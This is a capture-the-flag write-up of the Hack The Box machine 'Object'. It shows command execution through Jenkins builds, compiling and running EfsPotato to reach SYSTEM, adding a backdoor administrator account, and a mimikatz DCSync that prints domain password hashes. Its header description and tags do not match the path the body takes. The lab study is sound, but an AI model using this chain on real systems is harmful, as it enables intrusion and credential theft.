---
title: "HTB - Object"
author: [0x3ds]
date: 2025-11-01 12:00:00 +1000
description: "Object is a hard Windows machine running Jenkins automation server. The automation server is found to have registration enabled and the registered user can create builds. Builds can be triggered remotely by configuring an api token. Foothold is obtained by decrypting the Jenkins secrets. The foothold user is found to have ForceChangePassword permissions on another user called smith. This privilege abuse allows us to gain access to smith. smith has GenericWrite permissions on maria. Abusing this privilege allows us to gain access to the server as this user. maria has WriteOwner permissions on Domain Admins group, whose privileges we exploit to get a SYSTEM shell."
categories: [Hack The Box, Machines - Windows]
tags: [htb-blue, blue, hackthebox, machine, ctf, windows, easy, nmap, iis, gobuster, ffuf, wfuzz, jenkins, cicd, firewall, windows-firewall, jenkins-credential-decryptor, pwn-jenkins, evil-winrm, crackmapexec, bloodhound, sharphound, active-directory, github, forcechangepassword, genericwrite, writeowner, logon-script, powerview, scheduled-task, powershell]
image:
  path: /assets/img/posts/htb/machines/windows/hard/object/object_infocard.png
cover: /assets/img/posts/htb/machines/windows/hard/object/object_infocard.png
---

## User & Root Flags
---
### Initial Enumeration

We can start out by using the `nmap` tool to perform a port scan in an attempt to try and identify if there are any open ports on the target host.

```zsh
0x3ds@kali $ sudo nmap 10.129.236.140 -sV -sC -T4       

Nmap scan report for 10.129.236.140
Host is up (0.037s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Mega Engines
|_http-server-header: Microsoft-IIS/10.0
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp open  http    Jetty 9.4.43.v20210629
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(9.4.43.v20210629)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.48 seconds
```

We can see that we have discovered three open TCP ports:
- TCP Port 80 - IIS
- TCP Port 5985 - WinRM
- TCP Port 8080 - HTTP


We can now look further into these open ports that we found. First, we can navigate to the IIS server at http://10.129.236.140:80

![light mode only](/assets/img/posts/htb/machines/windows/hard/object/object_1.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/hard/object/object_1.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }


We can see that it is titled `Mega Engines` and mentions being open to receiving innovative automation ideas. Further it mentions to login and submit the code on the automation server which links to `object.htb:8080`. 

We can add this to our `/etc/hosts` file.

```zsh
0x3ds@kali $ echo "10.129.236.140  object.htb" | sudo tee -a /etc/hosts

10.129.236.140  object.htb
```

We can now attempt to access the automation server at `http://object.htb:8080`

![light mode only](/assets/img/posts/htb/machines/windows/hard/object/object_2.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/hard/object/object_2.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }


We can see that the automation server is hosting a `Jenkins` instance. 

Further, we can see that we are able to create an account. If we can successfully create an account, we may be able to see if we are able to further our access due to poor configuration of the Jenkins instance. 

We can attempt to create an account as follows:

![light mode only](/assets/img/posts/htb/machines/windows/hard/object/object_3.png){: .light .w-75 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/hard/object/object_3.png){: .dark .w-75 .shadow .rounded-10 w='1212' h='668' }


We can see that it was successful, and we now have an account that can access the automation server.

Additionally, we are able to identify the Jenkins version from the bottom right hand side of the page as being `Jenkins 2.317`. This will allow us to perform research and potentially identify publicly known vulnerabilities and corresponding exploits.


![light mode only](/assets/img/posts/htb/machines/windows/hard/object/object_4.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/hard/object/object_4.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }


After playing around with this new access, there was not much that stood out immediately other than the `New Item` section that allows us to create a new job. 

We can attempt to create a new job to see if we have the appropriate permissions to do so. We will select `Freestyle project` and call our job `shadownedya`.

![light mode only](/assets/img/posts/htb/machines/windows/hard/object/object_5.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/hard/object/object_5.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }

After selecting `OK`, we are taken to the configuration page for the new job where we have various options that we can select.


![light mode only](/assets/img/posts/htb/machines/windows/hard/object/object_6.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/hard/object/object_6.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }


After going through all of these options, we can see that we can select an option from the `Build Triggers` section. This allows us to have control over how we can have our new job triggered and built.

One of the easiest ways would be to select `Build periodically`, since it "*provides a cron-like feature to periodically execute this project*".

Another easy way would be to select the `Trigger builds remotely` option, since this would allow us to "*trigger new builds by accessing a special predefined URL*". This option would allow us to have more control over when we build the job in comparison to the periodic build that will build each time based upon the time period we set.

As such, we will select the `Trigger builds remotely` option.

![light mode only](/assets/img/posts/htb/machines/windows/hard/object/object_7.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/hard/object/object_7.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }

We can see that it requires an authentication token to be function. 


![light mode only](/assets/img/posts/htb/machines/windows/hard/object/object_10.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/hard/object/object_10.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }


Continuing on with the job configuration, another very interesting option that we can explore further is the `Execute Windows batch command` under `Build` > `Add build step`. 


![light mode only](/assets/img/posts/htb/machines/windows/hard/object/object_11.png){: .light .w-50 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/hard/object/object_11.png){: .dark .w-50 .shadow .rounded-10 w='1212' h='668' }


When selecting this option, we are given the opportunity to enter in a command that will be executed when the job is built. We can test this out by entering the command `whoami /all`.

![light mode only](/assets/img/posts/htb/machines/windows/hard/object/object_12.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/hard/object/object_12.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }


Now that we can configured our new job called `shadownedya`, we can select `Save` towards the bottom of the page to save our settings. 

We can now see that our job was successfully created.


![light mode only](/assets/img/posts/htb/machines/windows/hard/object/object_13.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/hard/object/object_13.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }


Our next steps are to try to build and trigger the job which should then attempt to execute the command we set on the target machine that is hosting the Jenkins instance.

Since we selected `Trigger builds remotely`, we can attempt to trigger the build by accessing a special predefined URL. However, it took some research online to try and find the predefined URL and how to authenticate. Thankfully, the jenkins documentation online has a page called [**Authenticating scripted clients**](https://www.jenkins.io/doc/book/system-administration/authenticating-scripted-clients/) which outlined how to do this. 


![light mode only](/assets/img/posts/htb/machines/windows/hard/object/object_14.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/hard/object/object_14.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }

Since we need to create an `apiToken` to authenticate when using `curl`, we will need to create token to use. We can attempt to generate a new token for our account by navigating to the `configure` section of our user account. 

![light mode only](/assets/img/posts/htb/machines/windows/hard/object/object_8.png){: .light .w-50 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/hard/object/object_8.png){: .dark .w-50 .shadow .rounded-10 w='1212' h='668' }


From here we can scroll down to the `API Token` heading and select `Add new Token`. Next, we need to give the new token a name, we will call it `srsken` and select `Generate` to create it. Finally, select `Save` at the bottom of the page.

![light mode only](/assets/img/posts/htb/machines/windows/hard/object/object_9.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/hard/object/object_9.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }

We now have our API token, `113cd8cf72a195b55d66f037ad1d0a7331`.


With the API token created, we now have all the components we need to put our `curl` command together to try and trigger the build.

Note that we needed to slightly modify the instructions provided in the Jenkins documentation to include `?token=ShadowsAuthToken` at the end of the URL to specify the token we set during the job configuration.

```zsh
0x3ds@kali $ curl -X POST -L --user shadows:113cd8cf72a195b55d66f037ad1d0a7331 \
    'http://object.htb:8080/job/shadownedya/build?token=ShadowsAuthToken'

```


We can now return to jenkins in our browser and refresh our project page to see that the job was triggered and the build was successful!

![light mode only](/assets/img/posts/htb/machines/windows/hard/object/object_15.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/hard/object/object_15.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }


From here we can click on the job build number to expand the drop down menu and select `Console Output`

![light mode only](/assets/img/posts/htb/machines/windows/hard/object/object_16.png){: .light .w-50 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/hard/object/object_16.png){: .dark .w-50 .shadow .rounded-10 w='1212' h='668' }


This takes us to the Console Output page where we can see that our command `whoami /all` was run successfully!

We can now review all of the output to understand which user the command executed as and see if the account is apart of any interesting groups or has any privileges that we can leverage to either move laterally or even escalate privileges. 


![light mode only](/assets/img/posts/htb/machines/windows/hard/object/object_17.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/hard/object/object_17.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }

---
### Vulnerability Analysis


After reviewing the output, we can see that we are executing commands as the user `object\oliver`. However, what is more interesting is that the user has the `SeImpersonatePrivilege` enabled. We can exploit this privilege using [**EfsPotato**](https://github.com/zcgonvh/EfsPotato) to escalate privileges and obtain access to the `NT Authority\System` account.

![light mode only](/assets/img/posts/htb/machines/windows/hard/object/object_18.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/hard/object/object_18.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }


First, we need to clone the git repository and then move into it:

```zsh
0x3ds@kali $ git clone https://github.com/zcgonvh/EfsPotato.git && cd EfsPotato

Cloning into 'EfsPotato'...
remote: Enumerating objects: 28, done.
remote: Counting objects: 100% (28/28), done.
remote: Compressing objects: 100% (27/27), done.
remote: Total 28 (delta 7), reused 7 (delta 1), pack-reused 0 (from 0)
Receiving objects: 100% (28/28), 73.30 KiB | 1.79 MiB/s, done.
Resolving deltas: 100% (7/7), done.
```

Next, we can execute the following commands to: 
- base64 encode the contents of `EfsPotato.cs` into a separate file called `EfsPotato.b64`
- split the base64 contents into separate 7000 character chunks to stay under the 8191 character limit imposed by cmd.exe
 
This will create 5 separate files containing the chunked base64 contents of `EfsPotato.b64`. The purpose for this is to transfer the contents of EfsPotato in base64 format across to the windows host and then decode it back to the original content.
```zsh
0x3ds@kali $ base64 -w0 EfsPotato.cs > EfsPotato.b64

0x3ds@kali $ split -b 7000 -d --additional-suffix=.b64 EfsPotato.b64 part_
```


We can take the contents from each file that was generated (the long base64 string) and create 5 commands that we will execute individually through our Jenkins build. We are wanting to combine the base64 strings back into one single file on the windows host machine. We will call this file `efspot.b64`, and we will store it within a directory we need to create, we will call it `%TEMP%\resource.temp`.

The format for our commands will remain the same, with the base64 string changing each time. The format will be:\
`cmd.exe /c powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-Content -Path %TEMP%\resource.temp\efspot.b64 -Value <Base64_String_Here> -Encoding ASCII"`


---
### Exploitation

First, we need to create the directory that we are going to store our files in. To do this, we will use the following command:\
`mkdir %TEMP%\resource.temp`

![light mode only](/assets/img/posts/htb/machines/windows/hard/object/object_19.png){: .light .w-50 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/hard/object/object_19.png){: .dark .w-50 .shadow .rounded-10 w='1212' h='668' }


We can now trigger the job again to build with the new command.

```zsh
0x3ds@kali $ curl -X POST -L --user shadows:113cd8cf72a195b55d66f037ad1d0a7331 \
    'http://object.htb:8080/job/shadownedya/build?token=ShadowsAuthToken'

```

We can now refresh our project page and access the Console Output of our newly built job.

![light mode only](/assets/img/posts/htb/machines/windows/hard/object/object_20.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/hard/object/object_20.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }


With the `%TEMP%\resource.temp` directory created successfully, we can start the process of executing each individual command to get the base64 contents of EfsPotato.b64 over to the windows host.

Our first command will be:\
`cmd.exe /c powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-Content -Path %TEMP%\resource.temp\efspot.b64 -Value dXNpbmcg<SNIP>c3RhdGlj -Encoding ASCII"`

![light mode only](/assets/img/posts/htb/machines/windows/hard/object/object_21.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/hard/object/object_21.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }


We can now trigger the job again to build with the new command.

```zsh
0x3ds@kali $ curl -X POST -L --user shadows:113cd8cf72a195b55d66f037ad1d0a7331 \
    'http://object.htb:8080/job/shadownedya/build?token=ShadowsAuthToken'

```

We can now refresh our project page and access the Console Output of our newly built job to see that it was successful.

![light mode only](/assets/img/posts/htb/machines/windows/hard/object/object_22.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/hard/object/object_22.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }






Our second command will be:\
`cmd.exe /c powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-Content -Path %TEMP%\resource.temp\efspot.b64 -Value IHZvaWQgUm<SNIP>0SGFuZGxl -Encoding ASCII"`

![light mode only](/assets/img/posts/htb/machines/windows/hard/object/object_23.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/hard/object/object_23.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }


We can now trigger the job again to build with the new command.

```zsh
0x3ds@kali $ curl -X POST -L --user shadows:113cd8cf72a195b55d66f037ad1d0a7331 \
    'http://object.htb:8080/job/shadownedya/build?token=ShadowsAuthToken'

```

We can now refresh our project page and access the Console Output of our newly built job to see that it was successful.

![light mode only](/assets/img/posts/htb/machines/windows/hard/object/object_24.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/hard/object/object_24.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }






Our third command will be:\
`cmd.exe /c powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-Content -Path %TEMP%\resource.temp\efspot.b64 -Value IDogV2F<SNIP>gICAgIH0K -Encoding ASCII"`

![light mode only](/assets/img/posts/htb/machines/windows/hard/object/object_25.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/hard/object/object_25.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }


We can now trigger the job again to build with the new command.

```zsh
0x3ds@kali $ curl -X POST -L --user shadows:113cd8cf72a195b55d66f037ad1d0a7331 \
    'http://object.htb:8080/job/shadownedya/build?token=ShadowsAuthToken'

```

We can now refresh our project page and access the Console Output of our newly built job to see that it was successful.

![light mode only](/assets/img/posts/htb/machines/windows/hard/object/object_26.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/hard/object/object_26.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }







Our fourth command will be:\
`cmd.exe /c powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-Content -Path %TEMP%\resource.temp\efspot.b64 -Value ICAgICAgIC<SNIP>IHB1Ymxp -Encoding ASCII"`

![light mode only](/assets/img/posts/htb/machines/windows/hard/object/object_27.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/hard/object/object_27.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }


We can now trigger the job again to build with the new command.

```zsh
0x3ds@kali $ curl -X POST -L --user shadows:113cd8cf72a195b55d66f037ad1d0a7331 \
    'http://object.htb:8080/job/shadownedya/build?token=ShadowsAuthToken'

```

We can now refresh our project page and access the Console Output of our newly built job to see that it was successful.

![light mode only](/assets/img/posts/htb/machines/windows/hard/object/object_28.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/hard/object/object_28.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }







Our fifth command will be:\
`cmd.exe /c powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-Content -Path %TEMP%\resource.temp\efspot.b64 -Value YyBzaG9yd<SNIP>ICB9Cgp9Cg== -Encoding ASCII"`

![light mode only](/assets/img/posts/htb/machines/windows/hard/object/object_29.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/hard/object/object_29.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }


We can now trigger the job again to build with the new command.

```zsh
0x3ds@kali $ curl -X POST -L --user shadows:113cd8cf72a195b55d66f037ad1d0a7331 \
    'http://object.htb:8080/job/shadownedya/build?token=ShadowsAuthToken'

```

We can now refresh our project page and access the Console Output of our newly built job to see that it was successful.

![light mode only](/assets/img/posts/htb/machines/windows/hard/object/object_30.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/hard/object/object_30.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }





Now that we have successfully transferred the base64 contents of our EfsPotato exploit onto the windows host machine, we can decode the contents of the `efspot.b64` file and store the decoded contents in a new file called `efspot.cs`.

To do this, we will use the `certutil` utility within our command:\
`cmd.exe /c powershell -NoProfile -ExecutionPolicy Bypass -Command "certutil -f -decode %TEMP%\resource.temp\efspot.b64 %TEMP%\resource.temp\efspot.cs"`

![light mode only](/assets/img/posts/htb/machines/windows/hard/object/object_31.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/hard/object/object_31.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }


We can now trigger the job again to build with the new command.

```zsh
0x3ds@kali $ curl -X POST -L --user shadows:113cd8cf72a195b55d66f037ad1d0a7331 \
    'http://object.htb:8080/job/shadownedya/build?token=ShadowsAuthToken'

```

We can now refresh our project page and access the Console Output of our newly built job to see that it was successful.

![light mode only](/assets/img/posts/htb/machines/windows/hard/object/object_32.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/hard/object/object_32.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }


With the EfsPotato exploit decoded and the original contents of the exploit stored within `efspot.cs`, we can now utilise the `csc.exe` executable on the windows host machine to directly compile the exploit on the system.

We can achieve this by executing the command below which will compile our exploit as `efspot.exe`:\
`cmd.exe /c powershell -NoProfile -ExecutionPolicy Bypass -Command "C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe /out:%TEMP%\resource.temp\efspot.exe %TEMP%\resource.temp\efspot.cs -nowarn:1691,618"`

![light mode only](/assets/img/posts/htb/machines/windows/hard/object/object_33.png){: .light .w-75 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/hard/object/object_33.png){: .dark .w-75 .shadow .rounded-10 w='1212' h='668' }


We can now trigger the job again to build with the new command.

```zsh
0x3ds@kali $ curl -X POST -L --user shadows:113cd8cf72a195b55d66f037ad1d0a7331 \
    'http://object.htb:8080/job/shadownedya/build?token=ShadowsAuthToken'

```

We can now refresh our project page and access the Console Output of our newly built job to see that it was successful.

![light mode only](/assets/img/posts/htb/machines/windows/hard/object/object_34.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/hard/object/object_34.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }


With the exploit successfully compiled, we can now execute it and pass another command to it to execute.

We can test it first to see if the exploits works by passing the `whoami` command. If all goes successful, it should return `NT Authority\System` as the output. 

Our command will be:\
`cmd.exe /c powershell -NoProfile -ExecutionPolicy Bypass -Command "%TEMP%\resource.temp\efspot.exe 'whoami'"`

![light mode only](/assets/img/posts/htb/machines/windows/hard/object/object_35.png){: .light .w-75 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/hard/object/object_35.png){: .dark .w-75 .shadow .rounded-10 w='1212' h='668' }


We can now trigger the job again to build with the new command.

```zsh
0x3ds@kali $ curl -X POST -L --user shadows:113cd8cf72a195b55d66f037ad1d0a7331 \
    'http://object.htb:8080/job/shadownedya/build?token=ShadowsAuthToken'

```

We can now refresh our project page and access the Console Output of our newly built job to see that it was successful.

![light mode only](/assets/img/posts/htb/machines/windows/hard/object/object_36.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/hard/object/object_36.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }


We can see that we have successfully escalated our privileges from the user `oliver` to the account `NT Authority\System`. We now have full control over the windows host machine.

We can utilise the escalate privileges to create a new account and add it to the Administrator group.

First we can create our new user called `shadows` using the following command:\
`cmd.exe /c powershell -NoProfile -ExecutionPolicy Bypass -Command "%TEMP%\resource.temp\efspot.exe 'net user shadows Shad0wsRUS1! /add'"`

![light mode only](/assets/img/posts/htb/machines/windows/hard/object/object_37.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/hard/object/object_37.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }


We can now trigger the job again to build with the new command.

```zsh
0x3ds@kali $ curl -X POST -L --user shadows:113cd8cf72a195b55d66f037ad1d0a7331 \
    'http://object.htb:8080/job/shadownedya/build?token=ShadowsAuthToken'

```

We can now refresh our project page and access the Console Output of our newly built job to see that it was successful.

![light mode only](/assets/img/posts/htb/machines/windows/hard/object/object_38.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/hard/object/object_38.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }



Now that our user `shadows` was created successfully, we can add it to the `Administrators` group using the following command:\
`cmd.exe /c powershell -NoProfile -ExecutionPolicy Bypass -Command "%TEMP%\resource.temp\efspot.exe 'net localgroup administrators shadows /add'"`

![light mode only](/assets/img/posts/htb/machines/windows/hard/object/object_39.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/hard/object/object_39.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }


We can now trigger the job again to build with the new command.

```zsh
0x3ds@kali $ curl -X POST -L --user shadows:113cd8cf72a195b55d66f037ad1d0a7331 \
    'http://object.htb:8080/job/shadownedya/build?token=ShadowsAuthToken'

```

We can now refresh our project page and access the Console Output of our newly built job to see that it was successful.

![light mode only](/assets/img/posts/htb/machines/windows/hard/object/object_40.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/hard/object/object_40.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }




Since we know from our initial `nmap` scan that there is a `WinRM` service running on open TCP Port 5985, we can now attempt to utilise the `evil-winrm` tool to access the windows host machine using our newly created users credentials (`shadows`:`Shad0wsRUS1!`).

```zsh
0x3ds@kali $ evil-winrm -i 10.129.236.140 -u shadows -p 'Shad0wsRUS1!'
                                        
Evil-WinRM shell v3.7
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\shadows\Documents> 
```

We can see that we have successfully authenticated to the windows host machine as our new user and can execute commands.

Since we have added our user to the Administrators group, we have administrators privileges and can perform various actions to create persistence if we wanted to.


---
### User Flag

Further enumeration of the host system led us to discover the `user.txt` flag file in the `C:\Users\oliver\Desktop` directory.

```zsh
*Evil-WinRM* PS C:\Users> ls C:\Users\oliver\Desktop

    Directory: C:\Users\oliver\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/31/2025   7:34 PM             34 user.txt
```


We can attempt to read the contents of the file and obtain the flag:

```zsh
*Evil-WinRM* PS C:\Users\shadows\Documents> cat C:\Users\oliver\Desktop\user.txt

4958f***************************
```

We can see that we have successfully obtained the `user.txt` flag!

> **Answer: `4958f***************************`**
{: .prompt-tip }


---
### Root Flag

After returning to the enumeration phase and continuing to look through the host system, we are able to identify the `root.txt` flag file in the `C:\Users\Administrator\Desktop` directory.

```zsh
*Evil-WinRM* PS C:\Users> ls C:\Users\Administrator\Desktop

    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/31/2025   7:34 PM             34 root.txt
```


We can attempt to read the contents of the file and obtain the flag:

```zsh
*Evil-WinRM* PS C:\Users\shadows\Documents> cat C:\Users\Administrator\Desktop\root.txt

2f930***************************
```

We can see that we have successfully obtained the `root.txt` flag!

> **Answer: `2f930***************************`**
{: .prompt-tip }




---
### Post Exploitation


With our user `shadows` being in the Administrator group, we can perform some simple post exploitation.

We will attempt to perform a DCSync attack against the target host and dump the password hashes of the accounts.

First we need to create a directory that we will be uploading `mimikatz.exe` to. We will create a directory `temp/`

```zsh
*Evil-WinRM* PS C:\Users\shadows> mkdir temp; cd temp

    Directory: C:\Users\shadows

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        11/1/2025   2:02 AM                temp
```


Now we can use the `evil-winrm` built in `upload` command to upload the `mimikatz.exe` binary onto the target. 

```zsh
*Evil-WinRM* PS C:\Users\shadows\temp> upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
                                        
Info: Uploading /usr/share/windows-resources/mimikatz/x64/mimikatz.exe to C:\Users\shadows\temp\mimikatz.exe
                                        
Data: 1807016 bytes of 1807016 bytes copied
                                        
Info: Upload successful!
```


With `mimikatz.exe` successfully uploaded onto the target host, we can now dump the password hashes.

```zsh
*Evil-WinRM* PS C:\Users\shadows\temp> .\mimikatz.exe "lsadump::dcsync /all /csv" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /all /csv
[DC] 'object.local' will be the domain
[DC] 'jenkins.object.local' will be the DC server
[DC] Exporting domain 'object.local'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
502     krbtgt          a2949eeb5f9dc9e0e295c85e2ee83043        514
1104    smith           742b7f2ccff4ca60d6d378eda85b9b09        66048
1000    JENKINS$        00b9a657f83a11222f37f502324d1fb6        532480
500     Administrator   2c535031ee490da0a41327b6ed228acd        66048
1103    oliver          cae9745fc314e1586606ea8ff899b45a        66048
1106    maria           fea9359fe981f9dc1e72ee60a1a6d3ca        66048
8604    shadows         625ea59accbd163536750b2c62433cef        512

mimikatz(commandline) # exit
Bye!
```

We can see that we have successfully dumped the password hashes. We could attempt to crack these password hashes to reveal the plaintext password, or alternatively we can use the password hashes to perform Pass-the-Hash attacks.
